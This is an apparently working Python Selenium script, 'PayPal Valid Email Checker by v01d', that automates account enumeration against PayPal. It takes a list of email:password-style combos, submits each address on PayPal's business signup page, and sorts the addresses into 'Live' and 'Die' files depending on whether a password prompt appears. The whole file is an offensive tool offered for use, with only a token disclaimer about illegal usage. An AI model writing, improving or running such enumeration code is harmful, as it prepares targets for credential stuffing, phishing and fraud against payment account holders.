from selenium import webdriver   
from selenium.webdriver.support.ui import WebDriverWait  
from selenium.webdriver.chrome.options import Options 
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By 
from selenium.webdriver.chrome.options import Options



# Some show...
print("_"*50)
print" "
print"PayPal Valid Email Checker by v01d"
print"I dont't Accept any Responsibility for any illegal usage!"
print("_"*55)
print" "


# Creating text documents
live = open('PayPalLive.txt', 'w')
die = open('PayPalDie.txt', 'w')

# Taking the mail list from the user
list_inp = raw_input("Input Mail List :")
list = open(list_inp, 'r')
print("-"*55)


while True:

# Opening the browser
    
    driver = webdriver.Chrome('C:\Users\90538\Documents\ChromeDriver\chromedriver.exe') #Write your own path here...
    
    
# Choose mails from the list
    email = list.readline().replace('\n','')
    if not email:
        break 
    bacot = email.strip().split(':')
    real_mail = str(bacot[0])
    

# Go to Paypal's website and enter the mail address    
    driver.get("https://www.paypal.com/bizsignup/#/checkAccount")
    
    timeout_email = 4 #Seconds
    mail_present = EC.presence_of_element_located((By.ID, 'email'))
    WebDriverWait(driver, timeout_email).until(mail_present)
    
    found_mail = driver.find_element_by_id("email")
    found_mail.send_keys(real_mail)
    driver.find_element_by_id("continueButton").click()

# Getting the redirected link and checking if the account is valid or not.
    live_status = False
    try:
        timeout_pass = 5 #Seconds
        pass_present = EC.presence_of_element_located((By.ID, 'password'))
        WebDriverWait(driver, timeout_pass).until(pass_present)
    
    except:
        print("\033 Live | "+email+" | [(Checked)]")
        live.write(email + '\n')
        live_status = True
            
    if not live_status:
        print("\033 Die | "+email+" | [(Checked)]")
        die.write(email + '\n')
        
    driver.close()
        
        
    
# More show... (and quit)
print("-"*50)
print("\033 Checking Done \033")
print("PayPal Valid Email was Saved in PayPalLive.txt")
driver.quit()
    

    


